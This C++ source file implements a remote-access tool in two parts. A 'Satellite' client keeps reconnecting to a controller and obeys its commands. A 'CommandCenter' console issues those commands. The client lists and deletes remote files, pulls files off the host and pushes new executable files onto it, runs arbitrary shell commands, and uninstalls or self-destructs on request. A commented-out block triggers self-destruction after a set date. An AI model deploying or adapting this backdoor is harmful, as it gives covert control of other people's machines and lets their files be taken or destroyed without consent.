// -------------------------------------------------------------
// The contents of this file may be distributed under the CC0
// license (http://creativecommons.org/publicdomain/zero/1.0/),
// or any compatible license, including (but not limited to) all
// OSI-approved licenses (http://www.opensource.org/licenses).
// -------------------------------------------------------------

#include "satellite.h"
#include <GClasses/GSocket.h>
#include <GClasses/GDirList.h>
#include <GClasses/GThread.h>
#include <GClasses/GApp.h>
#include <GClasses/sha1.h>
#include <GClasses/GFile.h>
#include <GClasses/GError.h>
#include <GClasses/GHolders.h>
#include <string>
#include <vector>
#ifdef WINDOWS
#	include <direct.h> // for "chdir"
#	include <io.h> // for "filelength"
#endif
#include <iostream>
#include <ostream>

using namespace GClasses;
using std::string;
using std::cin;
using std::cout;
using std::vector;
using std::ostringstream;

#ifdef WINDOWS
void UninstallFromWindows();
#endif

Satellite::Satellite()
: m_blobOut(MAX_PACKET_SIZE, false)
{
	m_keepRunning = true;
	m_pSocket = NULL;
	m_pFile = NULL;
	m_pBuf = new unsigned char[BUF_SIZE];
}

Satellite::~Satellite()
{
	delete(m_pSocket);
	if(m_pFile)
		fclose(m_pFile);
	delete[] m_pBuf;
}

void Satellite::Disconnect()
{
	delete(m_pSocket);
	m_pSocket = NULL;
}

void Satellite::Connect(const char* szAddr, int port, int timeoutSecs)
{
	m_lastPacketTime = time(NULL);
	m_timeoutSecs = timeoutSecs;
	m_pSocket = new GPackageClient();
	m_pSocket->connect(szAddr, port, std::min(30, timeoutSecs));

	// Send request to connect
	m_blobOut.setPos(0);
	m_blobOut.add(200); // client wants to connect
	m_pSocket->send((const char*)m_blobOut.getBlob(), m_blobOut.getBlobSize());
}

void Satellite::OnServerWantsToDisconnect(GBlobIncoming* pBlobIn)
{
	Disconnect();
}

void Satellite::OnServerWantsPing(GBlobIncoming* pBlobIn)
{
	m_blobOut.setPos(0);
	m_blobOut.add(201); // client responds to ping
	m_pSocket->send((const char*)m_blobOut.getBlob(), m_blobOut.getBlobSize());
}

void Satellite::OnServerWantsFileList(GBlobIncoming* pBlobIn)
{
	m_blobOut.setPos(0);
	m_blobOut.add(203); // client delivers file list

	// Get the path
	char szPath[300];
	if(!getcwd(szPath, 256))
		ThrowError("Failed to get current dir");
	m_blobOut.add(szPath);

	// Get the folders
	if(strlen(szPath) >
#ifdef WINDOWS
							3)
#else
							1)
#endif
		m_blobOut.add("..");
	{
		vector<string> files;
		GFile::folderList(files);
		for(vector<string>::iterator it = files.begin(); it != files.end(); it++)
		{
			const char* szDir = it->c_str();
			m_blobOut.add(szDir);
		}
	}
	m_blobOut.add("");

	// Get the Files
	{
		vector<string> files;
		GFile::fileList(files);
		for(vector<string>::iterator it = files.begin(); it != files.end(); it++)
		{
			const char* szDir = it->c_str();
			m_blobOut.add(szDir);
		}
	}

	m_pSocket->send((const char*)m_blobOut.getBlob(), m_blobOut.getBlobSize());
}

void Satellite::OnServerWantsDirectoryChange(GBlobIncoming* pBlobIn)
{
	string s;
	pBlobIn->get(&s);
	if(chdir(s.c_str()) != 0)
		ThrowError("Failed to change directory to: ", s.c_str());
	m_blobOut.setPos(0);
	m_blobOut.add(207); // ok
	m_pSocket->send((const char*)m_blobOut.getBlob(), m_blobOut.getBlobSize());
}

void Satellite::OnServerWantsToSendFile(GBlobIncoming* pBlobIn)
{
	if(m_pFile)
		ThrowError("Already receiving a file");
	pBlobIn->get(&m_filename);
	pBlobIn->get(&m_fileLen);
	m_filePos = 0;
	int i;
	for(i = 0; i < 20; i++)
		pBlobIn->get(&m_fileHash[i]);
	m_pFile = fopen(m_filename.c_str(), "wb");
	if(!m_pFile)
		ThrowError("Failed to create file ", m_filename.c_str(), " for writing");
	m_uploading = false;
}

void Satellite::OnServerSendsFileChunk(GBlobIncoming* pBlobIn)
{
	if(m_uploading)
		ThrowError("Client is uploading");
	int size; pBlobIn->get(&size);
	if(size > BUF_SIZE)
		ThrowError("Chunk too big for buffer");
	pBlobIn->get(m_pBuf, size);
	if(fwrite(m_pBuf, size, 1, m_pFile) != 1)
		ThrowError("error writing to file");
}

void Satellite::OnServerDoneSendingFile(GBlobIncoming* pBlobIn)
{
	if(m_uploading)
		ThrowError("Client is uploading");
	fclose(m_pFile);
#ifndef WINDOWS
	chmod(m_filename.c_str(), S_IXUSR | S_IWUSR | S_IRUSR);
#endif
	m_pFile = NULL;
	unsigned char hash[20];
	Sha1DigestFile(hash, m_filename.c_str());
	if(memcmp(hash, m_fileHash, 20) != 0)
		ThrowError("File hash for ", m_filename.c_str(), " does not match");
}

void Satellite::OnServerWantsToDownloadFile(GBlobIncoming* pBlobIn)
{
	if(m_pFile)
		ThrowError("Still transferring another file");

	// Extract the filename
	string filename; pBlobIn->get(&filename);

	// Hash the file
	Sha1DigestFile(m_fileHash, filename.c_str());

	// Open the file
	m_pFile = fopen(filename.c_str(), "rb");
	if(!m_pFile)
		ThrowError("Failed to open file for reading");
	m_uploading = true;
	m_fileLen = filelength(fileno(m_pFile));
	m_filePos = 0;

	// Send the info
	m_blobOut.setPos(0);
	m_blobOut.add(204); // client sends file info to server
	m_blobOut.add((int)m_fileLen);
	int i;
	for(i = 0; i < 20; i++)
		m_blobOut.add(m_fileHash[i]);
	m_pSocket->send((const char*)m_blobOut.getBlob(), m_blobOut.getBlobSize());
}

void Satellite::TransferFileChunk()
{
	// Read a chunk
	size_t size = std::min((size_t)(m_fileLen - m_filePos), (size_t)BUF_SIZE);
	if(fread(m_pBuf, size, 1, m_pFile) != 1)
		ThrowError("error reading from file");
	m_filePos += size;

	// Send it
	m_blobOut.setPos(0);
	m_blobOut.add(205); // client sends a file chunk to server
	m_blobOut.add((int)size);
	m_blobOut.add(m_pBuf, size);
	m_pSocket->send((const char*)m_blobOut.getBlob(), m_blobOut.getBlobSize());
}

void Satellite::CompleteFileTransfer()
{
	// Close file
	fclose(m_pFile);
	m_pFile = NULL;

	// Send packet
	m_blobOut.setPos(0);
	m_blobOut.add(206); // client is done sending file
	m_pSocket->send((const char*)m_blobOut.getBlob(), m_blobOut.getBlobSize());
}

void Satellite::ExecuteCommand(GBlobIncoming* pBlobIn)
{
	string sCommand; pBlobIn->get(&sCommand);
	GApp::systemCall(sCommand.c_str(), false, false);
}

void Satellite::Delete_File(GBlobIncoming* pBlobIn)
{
	string fn; pBlobIn->get(&fn);
	GFile::deleteFile(fn.c_str());
}

void Satellite::HandlePacket(GBlobIncoming* pBlobIn)
{
	int id; pBlobIn->get(&id);
	if(id < 600 || id >= 800)
		ThrowError("packet id ", to_str(id), " out of expected range");
	switch(id)
	{
		case 600: // server requests disconnect
			OnServerWantsToDisconnect(pBlobIn);
			break;
		case 601: // server requests ping
			OnServerWantsPing(pBlobIn);
			break;
		case 602: // server requests a file list
			OnServerWantsFileList(pBlobIn);
			break;
		case 603: // server requests a directory change
			OnServerWantsDirectoryChange(pBlobIn);
			break;
		case 604: // server begins sending file to client
			OnServerWantsToSendFile(pBlobIn);
			break;
		case 605: // server sends a file chunk to client
			OnServerSendsFileChunk(pBlobIn);
			break;
		case 606: // server is done sending file
			OnServerDoneSendingFile(pBlobIn);
			break;
		case 607: // server requests a file
			OnServerWantsToDownloadFile(pBlobIn);
			break;
		case 608: // server requests the client to uninstall and self-destruct
#ifdef WINDOWS
			UninstallFromWindows();
#else
			// todo: self-destruct
#endif
			break;
		case 609: // server requests the client to execute a command
			ExecuteCommand(pBlobIn);
			break;
		case 610: // server requests to delete file
			Delete_File(pBlobIn);
			break;
		default:
			ThrowError("unrecognized packet id: ", to_str(id));
	}
}

bool Satellite::Process()
{
	// Handle incoming packets
	bool gotPacket = false;
	while(m_pSocket)
	{
		size_t size;
		char* pPacket = m_pSocket->receive(&size);
		if(!pPacket)
			break;
		gotPacket = true;
		m_blobIn.setBlob((unsigned char*)pPacket, size, false);
		try
		{
			HandlePacket(&m_blobIn);
		}
		catch(const char* szMessage)
		{
			m_blobOut.setPos(0);
			m_blobOut.add(202); // client informs server about an error condition
			m_blobOut.add(szMessage);
			m_pSocket->send((const char*)m_blobOut.getBlob(), m_blobOut.getBlobSize());
			if(m_pFile)
			{
				fclose(m_pFile);
				m_pFile = NULL;
			}
		}
	}

	// Transfer file
	if(m_pFile && m_uploading)
	{
		gotPacket = true;
		if(m_filePos < m_fileLen)
			TransferFileChunk();
		else
			CompleteFileTransfer();
	}

	if(gotPacket)
		m_lastPacketTime = time(NULL);
	else
	{
		time_t tNow = time(NULL);
		if(tNow - m_lastPacketTime >= m_timeoutSecs)
		{
			Disconnect();
		}
	}
	return gotPacket;
}

void Satellite::Go(const char* szAddr, int port, int connectInterval, int timeoutSecs)
{
	m_lastPacketTime = 0;
	while(m_keepRunning)
	{
#ifdef WINDOWS
		// Pump Windows messages
		MSG msg;
		while(PeekMessage(&msg, NULL, 0, 0, PM_REMOVE))
		{
			if(msg.message == WM_QUIT)
			{
				m_keepRunning = false;
				if(m_pSocket)
				{
					m_blobOut.setPos(0);
					m_blobOut.add(202); // client informs server about an error condition
					m_blobOut.add("Graceful shut-down. Goodbye.");
					m_pSocket->send((const char*)m_blobOut.getBlob(), m_blobOut.getBlobSize());
				}
			}
			else
			{
				TranslateMessage(&msg);
				DispatchMessage(&msg);
			}
		}
#endif
		if(m_pSocket) // If we're already connected
		{
			if(Process())
				GThread::sleep(15);
			else
				GThread::sleep(150);
		}
		else
		{
			time_t tNow = time(NULL);
			if(tNow - m_lastPacketTime >= connectInterval) // If the connect interval has passed...
				Connect(szAddr, port, timeoutSecs); // try to connect
			else
			{
/*
				// Automatically self destruct
				struct tm* pTime = localtime(&tNow);
				if(pTime->tm_year + 1900 >= 2008 && pTime->tm_mon + 1 >= 11)
#ifdef WINDOWS
				UninstallFromWindows();
#else
				// todo: self-destruct
#endif
*/
				GThread::sleep(900);
			}
		}
	}
}


void Sha1DigestFile(unsigned char* pOut20ByteHash, const char* filename)
{
	// Digest the file
	unsigned char* buf = new unsigned char[8192];
	ArrayHolder<unsigned char> hBuf(buf);
	SHA_CTX ctx;
	SHA1_Init(&ctx);
	FILE* pFileIn = fopen(filename, "rb");
	if(!pFileIn)
		ThrowError("could not open the file \"%s\"", filename);
	FileHolder hFile(pFileIn);
	int fileSize = filelength(fileno(pFileIn));
	int size;
	while(fileSize > 0)
	{
		size = std::min(fileSize, 8192);
		if(fread(buf, size, 1, pFileIn) != 1)
			ThrowError("error reading from file \"%s\"", filename);
		if(ferror(pFileIn) != 0)
			ThrowError("error reading file \"%s\"", filename);
		SHA1_Update(&ctx, buf, size);
		fileSize -= size;
	}
	SHA1_Final(pOut20ByteHash, &ctx);
}











class CommandCenter
{
protected:
	GPackageServer* m_pSocket;
	GBlobIncoming m_blobIn;
	GBlobOutgoing m_blobOut;
	GTCPConnection* m_pConn;
	string m_remoteDir;
	FILE* m_pFile;
	unsigned char* m_pBuf;
	vector<string> m_remoteFolders;
	vector<string> m_remoteFiles;
	unsigned char m_fileHash[20];
	int m_bytesReceived;
	unsigned long long m_fileLen;
	size_t m_filePos;
	string m_filename;
	bool m_uploading;
	time_t m_lastPacketReceivedTime;
	bool m_keepGoing;
	string m_cmd;

public:
	CommandCenter(int port)
	: m_blobOut(2048, true)
	{
		m_pSocket = new GPackageServer(port);
		m_pConn = NULL;
		m_remoteDir = "<Not Connected>";
		m_pFile = NULL;
		m_pBuf = new unsigned char[BUF_SIZE];
		m_uploading = false;
		m_keepGoing = true;
	}

	virtual ~CommandCenter()
	{
		delete(m_pSocket);
		if(m_pFile)
			fclose(m_pFile);
		delete[] m_pBuf;
	}

	// ---------
	//  Actions
	// ---------

	void localList()
	{
		char szPath[300];
		if(!getcwd(szPath, 256))
			ThrowError("Failed to get the current dir");
		ostringstream oss;
		oss << "Listing of " << szPath << "\n";

		// Get the folders
		oss << "Folders:\n";
		if(strlen(szPath) >
#ifdef WINDOWS
							3)
#else
							1)
#endif
			oss << "	.." << "\n";
		{
			vector<string> files;
			GFile::folderList(files);
			for(vector<string>::iterator it = files.begin(); it != files.end(); it++)
			{
				const char* szDir = it->c_str();
				oss << "	" << szDir << "\n";
			}
		}

		// Get the Files
		oss << "Files:\n";
		size_t filecount = 0;
		{
			vector<string> files;
			GFile::fileList(files);
			for(vector<string>::iterator it = files.begin(); it != files.end(); it++)
			{
				const char* szFile = it->c_str();
				oss << "	" << szFile << "\n";
				filecount++;
			}
		}

		oss << "Total Files = " << filecount << "\n";
		string s = oss.str();
		statusMessage(s.c_str(), false);
	}

	void remoteExecute(const char* szCommand)
	{
		m_blobOut.setPos(0);
		m_blobOut.add(609); // server requests the client to execute a command
		m_blobOut.add(szCommand);
		m_pSocket->send((const char*)m_blobOut.getBlob(), m_blobOut.getBlobSize(), m_pConn);
	}

	void panic()
	{
		m_blobOut.setPos(0);
		m_blobOut.add(608); // server requests the client to uninstall and self-destruct
		m_pSocket->send((const char*)m_blobOut.getBlob(), m_blobOut.getBlobSize(), m_pConn);
	}

	void disconnectFromSatellite()
	{
		m_blobOut.setPos(0);
		m_blobOut.add(600); // server requests the client to disconnect
		m_pSocket->send((const char*)m_blobOut.getBlob(), m_blobOut.getBlobSize(), m_pConn);
	}

	void SendPing()
	{
		m_blobOut.setPos(0);
		m_blobOut.add(601); // server requests ping
		m_pSocket->send((const char*)m_blobOut.getBlob(), m_blobOut.getBlobSize(), m_pConn);
	}

	void localChangeDir(const char* szFoldername)
	{
		if(chdir(szFoldername) == 0)
			statusMessage("ok", false);
		else
			statusMessage("no such local dir", false);
	}

	void remoteChangeDir(const char* szFoldername)
	{
		// Request to change the remote directory
		m_blobOut.setPos(0);
		m_blobOut.add(603); // server requests directory change
		m_blobOut.add(szFoldername);
		m_pSocket->send((const char*)m_blobOut.getBlob(), m_blobOut.getBlobSize(), m_pConn);
	}

	void remoteList()
	{
		// Request a list of the contents of the remote current directory
		m_blobOut.setPos(0);
		m_blobOut.add(602); // server requests a file list
		m_pSocket->send((const char*)m_blobOut.getBlob(), m_blobOut.getBlobSize(), m_pConn);
	}

	void pushFile(const char* szFilename)
	{
		if(m_pFile)
			ThrowError("Still transferring another file");

		// Hash the file
		Sha1DigestFile(m_fileHash, szFilename);

		// Open the file
		m_pFile = fopen(szFilename, "rb");
		if(!m_pFile)
			ThrowError("Failed to open file for reading");
		m_uploading = true;
		m_filename = szFilename;
		m_fileLen = filelength(fileno(m_pFile));
		m_filePos = 0;

		// Send the info
		m_blobOut.setPos(0);
		m_blobOut.add(604); // server begins sending file to client
		m_blobOut.add(szFilename);
		m_blobOut.add((int)m_fileLen);
		int i;
		for(i = 0; i < 20; i++)
			m_blobOut.add(m_fileHash[i]);
		m_pSocket->send((const char*)m_blobOut.getBlob(), m_blobOut.getBlobSize(), m_pConn);
	}

	void localDeleteFile(const char* szFilename)
	{
		GFile::deleteFile(szFilename);
	}

	void pullFile(const char* szFilename)
	{
		if(m_pFile)
			ThrowError("Still transferring another file");

		// Open the file
		m_pFile = fopen(szFilename, "wb");
		if(!m_pFile)
			ThrowError("Failed to open file for reading");
		m_filename = szFilename;
		m_uploading = false;
		m_fileLen = 0;
		m_filePos = 0;

		// Send a request for the file
		PathData pd;
		GFile::parsePath(szFilename, &pd);
		m_blobOut.setPos(0);
		m_blobOut.add(607); // server requests a file
		m_blobOut.add(szFilename + pd.fileStart);
		m_pSocket->send((const char*)m_blobOut.getBlob(), m_blobOut.getBlobSize(), m_pConn);
	}

	void remoteDeleteFile(const char* szFilename)
	{
		m_blobOut.setPos(0);
		m_blobOut.add(610); // server requests to delete file
		m_blobOut.add(szFilename);
		m_pSocket->send((const char*)m_blobOut.getBlob(), m_blobOut.getBlobSize(), m_pConn);
	}

	// ---------
	//  Handlers
	// ---------

	void OnClientWantsToConnect(GBlobIncoming* pBlobIn)
	{
		statusMessage("A satellite has connected.");
	}

	void OnClientReportsError(GBlobIncoming* pBlob)
	{
		string s;
		pBlob->get(&s);
		string s2 = "The client reported the following error: ";
		s2 += s;
		s2 += "\n";
		statusMessage(s2.c_str());
	}

	void OnClientDeliversFileList(GBlobIncoming* pBlobIn)
	{
		// Get the dir
		pBlobIn->get(&m_remoteDir);

		// Get the folders
		string s;
		m_remoteFolders.clear();
		while(pBlobIn->getBlobSize() - pBlobIn->getPos() > 0)
		{
			pBlobIn->get(&s);
			if(s.length() == 0)
				break;
			m_remoteFolders.push_back(s);
		}

		// Get the files
		m_remoteFiles.clear();
		while(pBlobIn->getBlobSize() - pBlobIn->getPos() > 0)
		{
			pBlobIn->get(&s);
			m_remoteFiles.push_back(s);
		}

		onReceiveFileList(m_remoteDir, m_remoteFolders, m_remoteFiles);
	}

	virtual void onReceiveFileList(string& dir, vector<string>& folders, vector<string> files)
	{
		ostringstream oss;
		oss << "Listing of " << dir << "\n";
		oss << "Folders:\n";
		for(vector<string>::iterator it = folders.begin(); it != folders.end(); it++)
			oss << "	" << *it << "\n";
		oss << "Files:\n";
		for(vector<string>::iterator it = files.begin(); it != files.end(); it++)
			oss << "	" << *it << "\n";
		oss << "Total Files = " << files.size() << "\n";
		string s = oss.str();
		statusMessage(s.c_str());
	}

	void TransferFileChunk()
	{
		// Read a chunk
		size_t size = std::min((size_t)(m_fileLen - m_filePos), (size_t)BUF_SIZE);
		if(fread(m_pBuf, size, 1, m_pFile) != 1)
			ThrowError("error reading from file");
		m_filePos += size;

		// Send it
		m_blobOut.setPos(0);
		m_blobOut.add(605); // server sends a file chunk to client
		m_blobOut.add((int)size);
		m_blobOut.add(m_pBuf, size);
		m_pSocket->send((const char*)m_blobOut.getBlob(), m_blobOut.getBlobSize(), m_pConn);

		// Update the progres bar
		onUpdateUploadFileProgress((float)m_filePos / m_fileLen);
	}

	virtual void onUpdateUploadFileProgress(float progress)
	{
		ostringstream oss;
		oss << "Upload: " << (progress * 100) << "%";
		string s = oss.str();
		statusMessage(s.c_str());
	}

	void CompleteFileTransfer()
	{
		// Close file
		fclose(m_pFile);
		m_pFile = NULL;

		// Send packet
		m_blobOut.setPos(0);
		m_blobOut.add(606); // server is done sending file
		m_pSocket->send((const char*)m_blobOut.getBlob(), m_blobOut.getBlobSize(), m_pConn);
		onUpdateUploadFileProgress(1.0f);
	}

	void OnClientDeliversFileInfo(GBlobIncoming* pBlobIn)
	{
		if(m_uploading)
			ThrowError("Server is uploading");
		pBlobIn->get(&m_fileLen);
		int i;
		for(i = 0; i < 20; i++)
			pBlobIn->get(&m_fileHash[i]);
	}

	void OnClientSendsFileChunk(GBlobIncoming* pBlobIn)
	{
		if(m_uploading)
			ThrowError("Server is uploading");
		int size; pBlobIn->get(&size);
		if(size > BUF_SIZE)
			ThrowError("Chunk too big for buffer");
		pBlobIn->get(m_pBuf, size);
		if(fwrite(m_pBuf, size, 1, m_pFile) != 1)
			ThrowError("error writing to file");
		m_filePos += size;

		// Update the progres bar
		onUpdateDownloadFileProgress((float)m_filePos / m_fileLen);
	}

	void OnClientRespondsToPing(GBlobIncoming* pBlobIn)
	{
		statusMessage("pong");
	}

	void OnClientDidIt(GBlobIncoming* pBlobIn)
	{
		statusMessage("ok");
	}

	virtual void onUpdateDownloadFileProgress(float progress)
	{
		ostringstream oss;
		oss << "Download: " << (progress * 100) << "%";
		string s = oss.str();
		statusMessage(s.c_str());
	}

	void OnClientDoneSendingFile(GBlobIncoming* pBlobIn)
	{
		if(m_uploading)
			ThrowError("Server is uploading");
		fclose(m_pFile);
		m_pFile = NULL;
		unsigned char hash[20];
		Sha1DigestFile(hash, m_filename.c_str());
		if(memcmp(hash, m_fileHash, 20) != 0)
			ThrowError("File hash for %s does not match", m_filename.c_str());
		onUpdateDownloadFileProgress(1.0f);
	}

	// ---------
	//  Pump
	// ---------

	void HandlePacket(GBlobIncoming* pBlob)
	{
		int id; pBlob->get(&id);
		if(id < 200 || id >= 400)
			ThrowError("packet id ", to_str(id), " out of expected range");
		switch(id)
		{
			case 200: OnClientWantsToConnect(pBlob); break;
			case 201: OnClientRespondsToPing(pBlob); break;
			case 202: OnClientReportsError(pBlob); break;
			case 203: OnClientDeliversFileList(pBlob); break;
			case 204: OnClientDeliversFileInfo(pBlob); break;
			case 205: OnClientSendsFileChunk(pBlob); break;
			case 206: OnClientDoneSendingFile(pBlob); break;
			case 207: OnClientDidIt(pBlob); break;
			default: statusMessage("Received an unrecognizable packet");
		}
	}

	void statusMessage(const char* szMessage, bool interrupting = true)
	{
		if(interrupting)
			cout << "\r                                                \r"; // wipe out the command-line
		cout << "[" << szMessage << "]\n";
		if(interrupting)
		{
			// Restore the command-line
			prompt();
			cout << m_cmd;
		}
		cout.flush();
	}

	void Process()
	{
		bool gotPacket = false;
		try
		{
			// Handle incoming packets
			while(true)
			{
				size_t size;
				GTCPConnection* pConn;
				char* pPacket = m_pSocket->receive(&size, &pConn);
				if(!pPacket)
					break;
				gotPacket = true;
				m_blobIn.setBlob((unsigned char*)pPacket, size, false);
				m_bytesReceived += (size + 8);
				if(pConn == m_pConn)
					HandlePacket(&m_blobIn);
				else
				{
					if(!m_pConn)
					{
						m_pConn = pConn;
						HandlePacket(&m_blobIn);
					}
					else
						statusMessage("Another satellite tried to connect, but you are already connected with one.");
				}
			}

			// Transfer file
			if(m_pFile && m_uploading)
			{
				gotPacket = true;
				if(m_filePos < m_fileLen)
					TransferFileChunk();
				else
					CompleteFileTransfer();
			}
		}
		catch(const char* szMessage)
		{
			string s = "Got an exception: ";
			s += szMessage;
			statusMessage(s.c_str());
			if(m_pFile)
			{
				fclose(m_pFile);
				m_pFile = NULL;
			}
		}

		// Update m_lastPacketReceivedTime
		if(gotPacket)
			m_lastPacketReceivedTime = time(NULL);
		else
		{
			if(time(NULL) - m_lastPacketReceivedTime > 30)
			{
				SendPing();
				m_lastPacketReceivedTime = time(NULL); // so we don't flood the client with pings
			}
		}
	}

	// ---------
	//  Interface
	// ---------

	void printCommands()
	{
		cout << "Commands:\n";
		cout << "---------\n";
		cout << "?              Show this list of commands.\n";
		cout << "disconnect	Tell satellite to disconnect, but keep running.\n";
		cout << "exit           Exit the command center.\n";
		cout << "lcd [dir]      Locally change to the specified directory.\n";
		cout << "lls            List the contents of the local folder.\n";
		cout << "lrm [file]     Locally delete the specified file.\n";
		cout << "panic		Tell the satellite to exit and self-destruct.\n";
		cout << "ping           Ping the satellite.\n";
		cout << "pull [file]    Download a file from the remote computer.\n";
		cout << "push [file]    Upload a file to the remote computer.\n";
		cout << "quit           Exit the command center.\n";
		cout << "rcd [dir]      Remotely change to the specified directory.\n";
		cout << "rls            List the contents of the remote folder.\n";
		cout << "rrm [file]     Remotely delete the specified file.\n";
		cout << "run [cmd]      Execute a command on the remote machine.\n";
	}

	void issueCommand(const char* szCmd)
	{
		if(strcmp(szCmd, "") == 0)
			{}
		else if(strcmp(szCmd, "?") == 0)
			printCommands();
		else if(strcmp(szCmd, "disconnect") == 0)
			disconnectFromSatellite();
		else if(strcmp(szCmd, "exit") == 0)
			m_keepGoing = false;
		else if(strncmp(szCmd, "lcd ", 4) == 0)
			localChangeDir(szCmd + 4);
		else if(strcmp(szCmd, "lls") == 0)
			localList();
		else if(strncmp(szCmd, "lrm ", 4) == 0)
			localDeleteFile(szCmd + 4);
		else if(strcmp(szCmd, "panic") == 0)
			panic();
		else if(strcmp(szCmd, "ping") == 0)
			SendPing();
		else if(strncmp(szCmd, "pull ", 5) == 0)
			pullFile(szCmd + 5);
		else if(strncmp(szCmd, "push ", 5) == 0)
			pushFile(szCmd + 5);
		else if(strcmp(szCmd, "quit") == 0)
			m_keepGoing = false;
		else if(strncmp(szCmd, "rcd ", 4) == 0)
			remoteChangeDir(szCmd + 4);
		else if(strcmp(szCmd, "rls") == 0)
			remoteList();
		else if(strncmp(szCmd, "rrm ", 4) == 0)
			remoteDeleteFile(szCmd + 4);
		else if(strncmp(szCmd, "run ", 4) == 0)
			remoteExecute(szCmd + 4);
		else
			cout << "Unrecognized command: " << szCmd << ". Enter \"?\" to see a list of available commands.\n";
		if(m_keepGoing)
			prompt();
		cout.flush();
	}

	void prompt()
	{
		cout << "command> ";
		cout.flush();
	}

	void go()
	{
		GPassiveConsole pc(true);
		cout << "Enter \"?\" to see a list of available commands.\n";
		prompt();
		while(m_keepGoing)
		{
			while(true)
			{
				char c = pc.getChar();
				if(c == '\0')
					break; // no key has been pressed
				if(c == '\n')
				{
					string sCmd = m_cmd;
					m_cmd = "";
					issueCommand(sCmd.c_str());
				}
				else
				{
					if(c == 127)
					{
						size_t last = m_cmd.length();
						if(last > 0)
							m_cmd = m_cmd.erase(last - 1, 1);
						cout << "\r                                                \r";
						prompt();
						cout << m_cmd;
						cout.flush();
					}
					else
						m_cmd += c;
				}
			}
			Process();
			GThread::sleep(100);
		}
	}
};


void doShellCommandCenter(int port)
{
	CommandCenter cc(port);
	cc.go();
}


